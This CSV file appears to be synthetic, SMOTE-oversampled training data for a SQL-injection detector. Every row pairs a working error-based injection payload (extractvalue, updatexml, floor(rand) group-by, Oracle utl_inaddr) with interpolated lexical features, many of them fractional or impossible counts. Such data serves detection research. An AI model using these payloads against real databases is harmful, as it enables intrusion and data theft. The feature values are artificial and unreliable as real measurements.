id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000413,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,1.0650060349091321,194.1237909644101,32.270793032147004,3.6588525184372145,53.62475819288202,34.18762090355899,80.95744670723408,25.35396516073502,0.27657725741056177,0.1773338511625751,0.4156411978597864,0.13044769356707664,0.0,4.0,0.0,0.0,0.2707930321470037,0.9999999999999999,0.0,15.083172128588014,0.0,0.0,4.729206967852996,1.2707930321470036,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5415860642940076,0.0,0.0,0.27079303214700357,1.7292069678529964,0.27079303214700373,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.812379096441012
SMOTE_000414,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.06729818634711889,333.0390142074568,33.01950710372839,3.4554436957179484,80.98049289627161,49.05852131118515,146.0,57.0,0.24315668489672762,0.14730470082434022,0.43838737775726155,0.1711512365216706,0.9804928962716145,0.0,0.0195071037283856,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.019507103728383,0.9804928962716144,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9804928962716144,0.019507103728385655,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000415,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,0.7567977680839341,325.05823758348197,34.514559395870485,3.6237113276329107,89.02911879174097,48.0,132.77183909380574,55.257279697935246,0.27386080703362475,0.14768273826375528,0.40845937038788205,0.16999708431473792,0.0,0.0,1.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,23.0,0.0,0.0,0.0,0.2572796979352442,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000416,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,0.11806976351604431,296.4509799104942,38.97347176997093,3.9892435517456515,102.2918105303198,55.0,108.07958469008722,31.079584690087216,0.345030394246009,0.1855430889487395,0.3645934206667434,0.10483309613850805,0.10611292011628692,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,20.0,0.0,0.0,6.0,4.0,0.026528230029071787,0.0,0.0,0.9734717699709283,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.026528230029071675,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.026528230029072
SMOTE_000417,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,1.8743256631182352,303.15918449074593,38.57887150054436,4.022817641407974,106.63241349401207,55.0,109.26338549836693,32.26338549836693,0.35151279656518747,0.18156079843071599,0.36055576140354945,0.10637064360054709,1.68451399782257,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,20.0,0.0,0.0,6.0,4.0,0.4211284994556425,0.0,0.0,0.5788715005443575,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.42112849945564257,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.421128499455643
SMOTE_000418,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.45182284094291075,223.42474199667825,42.30137455537101,4.3597875020942345,124.2192437751942,2.0,71.90412366611304,25.301374555371012,0.5553136260816107,0.008978373835271336,0.3222918131447029,0.11341618693841518,3.0,0.0,0.0,0.0,0.0,3.150687277685507,0.0,10.0,0.0,6.150687277685507,1.0,3.150687277685507,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.1506872776855068,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.150687277685507
SMOTE_000419,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000023,0.5610049766634205,189.78574987042248,34.14299948168989,3.959242065566003,48.78574987042247,47.0,66.0,28.0,0.2570534873775987,0.24764883754080044,0.3477621973977198,0.1475354776838811,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.7857498704224735,0.21425012957752654,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000420,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000076,2.5686125160157247,205.92344743982449,32.46172371991225,3.5845874848981367,51.01943918490128,40.0,89.23086185995612,25.67314639496709,0.24728559703519043,0.19453926508917851,0.4335964314279122,0.12457870644771882,0.0,0.557715464989031,1.115430929978062,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,4.1154309299780625,0.0,0.557715464989031,0.557715464989031,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.557715464989031,1.0,1.0,0.442284535010969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000421,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,1.2048767631274173,213.306075175108,32.0,3.533893202293582,56.66201283477454,33.00199449938234,94.9800550061766,28.662012834774536,0.2664776296282139,0.15673483837232569,0.4427392021461737,0.1340483298532867,0.0,4.0,0.0,0.0,0.6660018335392198,0.9999999999999999,0.0,17.996011001235317,0.0,0.0,4.3339981664607805,1.6660018335392195,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.3320036670784394,0.0,0.0,0.6660018335392197,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.998005500617659
SMOTE_000422,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000077,0.10676428995147925,218.85417370209393,38.11141396114269,3.748533803137601,63.40851785752318,37.2971038963805,93.14855194819025,25.0,0.28966165346431416,0.17035601321773713,0.4257098894211949,0.11427244389675381,1.0,0.0,1.0,0.0,1.0,1.0371379870475623,0.0,16.96286201295244,0.0,0.0,3.0,3.0371379870475623,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.03713798704756249,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.037137987047562
SMOTE_000423,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000030,0.6878332507100577,291.7747591748517,40.119368979371295,4.028355632230451,107.35810693811388,45.38737958742583,104.90990366994066,34.119368979371295,0.36847358479610387,0.1549389263292373,0.3594853664744776,0.11710212240018118,0.0,1.0,2.0,0.0,2.0,2.0,0.0,19.238737958742583,0.0,1.761262041257417,5.119368979371291,6.119368979371291,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.358106938113875,0.35810693811387495,1.0,1.8806310206287082,0.11936897937129165,0.8806310206287082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.8806310206287083,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.477475917485167
SMOTE_000424,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000019,0.7404643775810555,224.0844668693302,38.7936261133909,3.787043096195332,65.90996241576663,39.11633630237573,94.05816815118787,25.0,0.293769279262045,0.17422125013804657,0.42022584106953526,0.11178362953037316,1.0,0.0,1.0,0.0,1.0,1.264542037796966,0.0,16.735457962203036,0.0,0.0,3.0,3.264542037796967,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.2645420377969662,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.264542037796966
SMOTE_000425,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,1.4582619616939223,281.85768755404945,37.288536766825466,4.019931039024117,104.95256251801648,40.15414706730188,101.24109928484195,35.50987868388914,0.37267155872698066,0.14234757102230838,0.3590856697404986,0.12589520051021236,2.9328051502382024,0.0,0.0,0.0,2.0,1.6442683834127343,0.0,19.28853676682547,0.0,2.0,5.355731616587265,4.932805150238203,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.6442683834127343,0.0,0.6442683834127343,2.0,-1.1102230246251565e-16,0.6442683834127343,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.932805150238202
SMOTE_000426,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000057,0.3274311725544845,299.5373497412729,38.15421675290902,4.021522747005098,110.69156649418196,43.0,108.07710837645452,37.76867487063646,0.3695331533670441,0.14355888844813225,0.36082878391019135,0.1260791742746323,3.7686748706364632,0.0,0.1542167529090248,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,6.0,1.0,0.0,0.07710837645451239,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.922891623545487,0.0,1.0,2.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.922891623545487
SMOTE_000427,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,1.324948692209121,340.35006676758593,33.61250556396549,3.616425751120256,95.08762797120635,46.549977744138026,141.09995548827607,57.6125055639655,0.27889476177253125,0.136910730880326,0.4148946810247498,0.16929982632239293,2.8375166918964796,0.0,0.0,0.0,0.0,2.0,0.0,29.162483308103518,0.0,1.83751669189648,0.3874944360345065,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.6125055639654933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.6125055639654935
SMOTE_000428,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000011,1.3392502430461146,340.8972368336092,34.63119433329089,3.6604442646321242,93.36880566670911,51.42201416677277,138.42201416677275,57.684402833354554,0.27392961142531325,0.15076865143491636,0.40605885918309165,0.16924287795667878,0.6844028333545533,0.0,2.3155971666454467,0.0,0.0,2.6844028333545533,0.0,28.0,0.0,3.0,0.0,25.0,0.6844028333545533,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.6844028333545532,1.0,0.6844028333545533,0.3155971666454467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.684402833354554
SMOTE_000429,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,0.3721408630140497,315.9760751735435,37.22720429563106,4.000404833607923,109.11360214781553,55.0,116.18086013883482,35.68161288689318,0.3456832527543985,0.17426213575570002,0.3671962228322069,0.1128583886576946,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.681612886893177,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.1136021478155294,0.8863978521844708,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000430,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000017,1.1018799749794028,340.30521380286154,34.0,3.3584939749206297,78.23159539904616,48.4631907980923,155.72622530524617,57.88420230047693,0.22990473457741967,0.14243706219295418,0.45756313093219836,0.17009507229742776,0.0,0.0,1.0,0.0,0.0,2.0,0.0,31.88420230047692,0.0,0.0,0.11579769952307561,23.0,0.0,0.0,0.0,0.8842023004769244,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.11579769952307573,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.8842023004769245,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000431,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,1.0416645127461504,332.24658073622135,33.37670963188932,3.4686157934633943,80.62329036811069,50.13012889566795,144.49316147244272,57.0,0.24265881579114096,0.15089636887203742,0.4348840258642489,0.17156078947257272,1.0,0.0,0.3767096318893184,0.0,0.0,2.0,0.0,30.62329036811068,0.0,0.0,1.0,22.376709631889316,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6232903681106816,0.3767096318893184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000432,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,1.282636695514959,305.5344639301809,38.48462357134157,3.9497537091222013,102.0,57.061505714633704,114.44220535823032,32.030752857316855,0.3347281539558634,0.18668137910246355,0.37376400740175963,0.10482645953991336,0.0,0.0,0.0,0.0,2.0,1.257688214329213,0.0,21.030752857316852,0.0,0.0,6.0,4.257688214329213,0.0,0.0,0.0,0.7423117856707868,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.5153764286584264,0.7423117856707868,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.257688214329214
SMOTE_000433,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000013,0.04709449076488716,189.19808046586587,31.024760058233234,3.8961399821200042,48.27236064056559,46.90095976706706,66.04952011646647,27.975239941766766,0.25509543412309865,0.2479244652346031,0.34910659875016825,0.14787350189212992,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.975239941766764,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.024760058233235127,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.024760058233236
SMOTE_000434,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,0.9216512361207897,236.35938260256864,32.47569275498474,3.8614237045188853,79.95138550996948,42.902771019938974,87.45661158262968,26.048614490030513,0.33847761630833945,0.18180992932978318,0.3695968899145677,0.11011556444730969,2.5243072450152564,0.0,0.0,0.0,0.0,2.0,0.0,15.048614490030513,0.0,0.0,5.0,3.4756927549847427,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7378463774923718,0.0,0.7378463774923716,0.0,0.2621536225076283,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.737846377492372
SMOTE_000435,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,1.0383168136876073,193.9202074661954,32.264006915539845,3.6600922519247683,53.584041493239084,34.20797925338046,80.80815214187663,25.320034577699232,0.276652253322887,0.17760545798018534,0.4153300661694643,0.13041222252746335,0.0,4.0,0.0,0.0,0.2640069155398468,0.9999999999999999,0.0,15.056027662159387,0.0,0.0,4.735993084460153,1.2640069155398468,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.5280138310796936,0.0,0.0,0.2640069155398469,1.7359930844601532,0.2640069155398468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.79202074661954
SMOTE_000436,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,0.6297347562902375,235.10539305541863,31.0,3.7591939363293596,77.0,37.0,93.49855898681534,27.606834068603288,0.3288417259285401,0.1580148553163115,0.39595980326174546,0.117183615493403,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.606834068603288,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000437,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000012,0.44945859134378097,215.7605318158195,33.23946818418052,3.5383089328988233,57.76053181581949,32.63858182448137,96.52106363163897,28.84035454387966,0.26769614038644324,0.15131274247917215,0.4473304242370789,0.13366069289730573,0.0,3.760531815819486,0.1596454561203428,0.0,1.0,1.0798227280601713,0.0,17.84035454387966,0.0,0.0,4.0,2.239468184180514,0.0,1.0,0.07982272806017131,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.07982272806017127,1.0,1.0,0.9201772719398287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
